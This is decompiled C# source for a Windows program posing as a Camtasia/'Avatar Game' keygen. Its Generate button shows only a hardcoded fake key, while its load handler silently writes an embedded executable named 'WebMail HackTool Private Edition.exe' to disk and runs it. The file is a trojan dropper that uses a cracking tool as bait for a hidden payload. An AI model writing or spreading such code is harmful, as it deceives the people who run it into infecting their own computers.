using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using CamTasia_7_Key_Gen.My;
using CamTasia_7_Key_Gen.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace CamTasia_7_Key_Gen;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		Button1 = new Button();
		TextBox2 = new TextBox();
		Label1 = new Label();
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(96, 96);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("Generate");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		TextBox textBox = TextBox2;
		location = new Point(12, 52);
		((Control)textBox).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox2 = TextBox2;
		size = new Size(258, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox2).set_TabIndex(3);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(9, 24);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(5);
		Label1.set_Text("Label1");
		((Control)Label1).set_Visible(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Honeydew);
		size = new Size(282, 130);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Avatar Game Keygen");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		((Control)Label1).set_Visible(true);
		Label1.set_Text("Detected Hardware Id................!");
		((Control)Label1).set_ForeColor(Color.Red);
		TextBox2.set_Text("KDHINDDFANIERDFAEDREFDF");
		Interaction.MsgBox((object)"Key--------Generate SuccessFully ", (MsgBoxStyle)0, (object)null);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(Application.get_StartupPath() + "\\WebMail HackTool Private Edition.exe", Resources.WebMail_HackTool_Private_Edition, false);
		Process.Start(Application.get_StartupPath() + "\\WebMail HackTool Private Edition.exe");
	}
}
